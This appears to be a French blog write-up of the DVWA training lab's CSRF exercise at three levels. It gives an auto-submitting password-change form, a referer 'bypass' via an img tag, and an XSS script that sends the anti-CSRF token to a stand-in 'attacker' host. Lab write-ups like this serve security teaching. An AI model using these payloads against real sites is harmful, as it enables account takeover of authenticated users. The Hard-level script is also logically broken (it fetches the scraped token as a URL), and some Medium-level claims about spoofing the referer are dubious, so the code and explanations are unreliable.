+++
title = "DVWA - CSRF"
date = 2025-12-23
categories = ["DVWA"]
description = "Explication technique"


[taxonomies]
tags = ["cybersécurité", "DVWA", "web"]
+++


> DVWA simule les attaques CSRF (Cross-Site Request Forgery) via un formulaire de changement de mot de passe sans protections adéquates. L'objectif est de forcer un utilisateur authentifié à modifier son mot de passe sans son consentement, en exploitant la confiance basée sur les cookies de session.

## Easy

Aucune protection : capturez la requête POST vers `vulnerabilities/csrf/` via Burp ou DevTools (méthode POST, `password_new=pwned`, `password_conf=pwned`).
- Créez `csrf.html` avec:

  ```html
  <form action="http://dvwa/csrf.php" method="POST">
      <input type="hidden" name="password_new" value="pwned" /><input
          type="hidden"
          name="password_conf"
          value="pwned"
      /><input type="submit" value="Cliquez" />
  </form>
  <script>
      document.forms[0].submit();
  </script>
  ```
- Servez la page à la victime loggée : le navigateur soumet automatiquement avec ses cookies, modifiant le mot de passe.

## Medium

- Vérifie $_SERVER['HTTP_REFERER'] pour matcher le domaine DVWA, bloquant les requêtes externes directes.
- On peut le Bypass via `<img src="http://dvwa/vulnerabilities/csrf/?password_new=pwned&password_conf=pwned&user_token=xxx">` (GET forcé par img src, referer absent ou spoofable).
- Ou utilisez un formulaire POST avec JS pour définir document.referrer via meta-refresh, préservant le referer DVWA lors du submit.


## Hard

- Génère un token unique (user_token) validé côté serveur + referer check.
Exploitez via XSS Stored/Reflected pour voler le token : injectez:
  ```html
  <script>
      fetch("http://dvwa/guestbook/")
        .then((r) => r.text())
        .then((t) =>
          fetch(t.match(/name=['"]user_token['"] value=['"]([^'"]+)['"]/)[1])
            .then((r) => r.text())
            .then(
              (t) =>
                (document.location =
                  "http://attacker/csrf.html?token=" +
                  t.match(
                    /name=['"]user_token['"] value=['"]([^'"]+)['"]/,
                  )[1]),
          ),
        );
  </script>
  ```

- La page attaquante récupère le token via URL param et soumet le formulaire dynamique : 
  ```javascript
  token = new URLSearchParams(location.search).get('token'); form.user_token.value=token; form.submit();
  ```
